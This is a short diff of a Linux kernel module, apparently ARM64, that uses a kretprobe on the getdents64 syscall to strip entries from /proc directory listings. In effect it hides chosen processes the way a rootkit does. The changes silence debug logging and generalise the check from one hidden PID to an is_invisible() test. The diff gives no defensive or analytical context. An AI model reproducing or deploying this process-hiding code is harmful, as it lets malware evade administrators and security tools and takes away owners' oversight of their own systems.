@@ -78,7 +78,7 @@ static int handler_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 	    //For storing the directory inode value
 	    struct inode *d_inode;
 		int ret = (int)regs_return_value(regs); // *(int*)(regs->regs[0]);
-		wuwa_info("ret_dent2 - ret %d, pid %d fd %d", ret, pid_hide, fd);
+		// wuwa_info("ret_dent2 - ret %d, pid %d fd %d", ret, pid_hide, fd);
 		int err = 0;
 
 		if(ret <= 0) return 0;
@@ -107,7 +107,7 @@ static int handler_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 	    {
 		    dir = (void *)kdirent + offset;
 
-		    if ((proc && pid_hide > 0 && pid_hide == simple_strtoul(dir->d_name, NULL, 10) /*is_invisible(simple_strtoul(dir->d_name, NULL, 10))*/))
+		    if ((proc && pid_hide > 0 && /*pid_hide == simple_strtoul(dir->d_name, NULL, 10)*/ is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
 		    {			
 			    if (dir == kdirent)
 			    {
@@ -161,7 +161,7 @@ static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
 	if ((uint32_t)(regs->regs[1]) == 61) { // getdents64			
 		int fd = *(int*)(regs->user_regs.regs[0]);
 		struct linux_dirent *dirent = *(struct linux_dirent **) (regs->user_regs.regs[0] + 8);
-		wuwa_info("dents called pre %d", fd);		
+		// wuwa_info("dents called pre %d", fd);		
 		d->fd = fd;
 		d->dirent = dirent;
 		d->sys_ns = 61;
